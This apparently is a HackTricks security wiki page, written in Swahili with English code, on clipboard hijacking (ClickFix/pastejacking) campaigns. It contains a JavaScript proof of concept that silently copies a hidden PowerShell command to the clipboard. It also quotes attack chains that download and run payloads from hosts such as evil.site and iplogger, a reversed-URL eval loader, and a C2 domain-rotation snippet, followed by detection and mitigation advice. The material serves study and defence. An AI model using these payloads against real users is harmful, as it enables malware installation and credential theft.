# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Usibandike chochote usichokopia mwenyewe." – ushauri wa zamani lakini bado sahihi

## Muhtasari

Clipboard hijacking – also known as *pastejacking* – hunufaisha ukweli kwamba watumiaji mara kwa mara wanakopa-na-kubandika amri bila kuziangalia. Ukurasa wa wavuti wenye madhara (au muktadha wowote unaoweza kukimbia JavaScript kama Electron au Desktop application) unaweka kwa njia ya programu maandishi yanayotawaliwa na mshambuliaji kwenye clipboard ya mfumo. Waathiriwa wanahimizwa, kawaida kwa maagizo ya social-engineering yaliyotengenezwa kwa uangalifu, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *kubandika* yaliyomo kwenye clipboard, na mara moja kuendesha amri yoyote.

Kwa sababu **hakuna faili inapakuliwa na hakuna kiambatanisho kinachofunguliwa**, mbinu hii hupita vikwazo vingi vya usalama vya barua pepe na yaliyomo kwenye wavuti vinavyotiwa nadharia kusimamia viambatanisho, macros au utekelezaji wa amri moja kwa moja. Kwa hivyo shambulio hili ni maarufu katika kampeni za phishing zinazowasilisha familia za malware za kawaida kama NetSupport RAT, Latrodectus loader au Lumma Stealer.

## JavaScript Uthibitisho wa Dhana
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Kampeni za zamani zilitumia `document.execCommand('copy')`, zile za baadaye hutegemea asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Mtumiaji anatembelea tovuti typosquatted au compromised (kwa mfano `docusign.sa[.]com`)
2. Injected **ClearFake** JavaScript inaita helper `unsecuredCopyToClipboard()` ambayo kimya kimya inaweka PowerShell one-liner iliyofichwa kwa Base64 kwenye clipboard.
3. Maelekezo ya HTML humuambia mwathiriwa: *“Bonyeza **Win + R**, bandika amri na bonyeza Enter ili kutatua tatizo.”*
4. `powershell.exe` inaendesha, ikipakua archive inayojumuisha executable halali pamoja na DLL mbaya (classic DLL sideloading).
5. Loader ina-decrypt hatua za ziada, inajaza shellcode na kusanidi persistence (kwa mfano scheduled task) – hatimaye ikiwasha NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart halali) inatafuta `msvcp140.dll` katika saraka yake.
* DLL hasidi inatatua APIs kwa wakati wa utekelezaji kwa kutumia **GetProcAddress**, inapakua binaries mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, inazifumbua kwa kutumia ufunguo wa rolling XOR `"https://google.com/"`, inaingiza shellcode ya mwisho na inaifungua **client32.exe** (NetSupport RAT) kwa `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Inapakua `la.txt` kwa **curl.exe**
2. Inaendesha JScript downloader ndani ya **cscript.exe**
3. Inapata MSI payload → drops `libcef.dll` kando ya programu iliyosainiwa → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer kupitia MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Kiito cha **mshta** huanzisha script ya PowerShell iliyofichwa ambayo inapata `PartyContinued.exe`, hutoa `Boat.pst` (CAB), inajenga upya `AutoIt3.exe` kupitia `extrac32` na kuunganisha faili, na hatimaye inaendesha script ya `.a3x` ambayo exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Baadhi ya kampeni za ClickFix hupuuza downloads za faili kabisa na kuwashauri waathirika kubandika one‑liner that fetches and executes JavaScript via WSH, persists it, and rotates C2 daily. Mfano wa mnyororo uliotazamwa:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sifa kuu
- URL iliyofichwa iliyopindishwa wakati wa runtime ili kuzuia uchunguzi wa kawaida.
- JavaScript hujiendeleza kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa – ikiruhusu mzunguko wa domain wa haraka.

Sehemu ndogo ya JS inayotumika kuzungusha C2s kulingana na tarehe:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Hatua inayofuata kwa kawaida huweka loader ambayo inaanzisha persistence na kushusha RAT (mf., PureHVNC), mara nyingi ikifanya pinning ya TLS kwa hardcoded certificate na kugawanya traffic.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Uchunguzi wa tishio
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Changanisha clipboard write events zilizofuata na Win+R paste kisha kutekelezwa mara moja kwa `powershell.exe`.

Blue-teams wanaweza kuunganisha telemetry ya clipboard, process-creation na registry kutambua kwa usahihi matumizi mabaya ya pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` inahifadhi historia ya **Win + R** amri – tazama kwa maingizo ya Base64 yasiyo ya kawaida / yaliyofichwa.
* Security Event ID **4688** (Process Creation) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` katika { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** kwa uundaaji wa faili chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au folda za muda kabla ya tukio la 4688 lenye shaka.
* EDR clipboard sensors (if present) – changanisha `Clipboard Write` ikifuatiwa mara moja na mchakato mpya wa PowerShell.

## Mitigations

1. Kuimarisha browser – zima clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) au hitaji ishara ya mtumiaji.
2. Uhamasishaji wa usalama – fundisha watumiaji ku-*type* amri nyeti au kuzimimina kwanza kwenye text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuzuia arbitrary one-liners.
4. Udhibiti wa mtandao – ziba requests za outbound kwa domains za pastejacking zinazojulikana na C2 za malware.

## Related Tricks

* **Discord Invite Hijacking** mara nyingi inatumia mbinu ile ile ya ClickFix baada ya kuvutwa kwa watumiaji kwenye server ya hatari:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
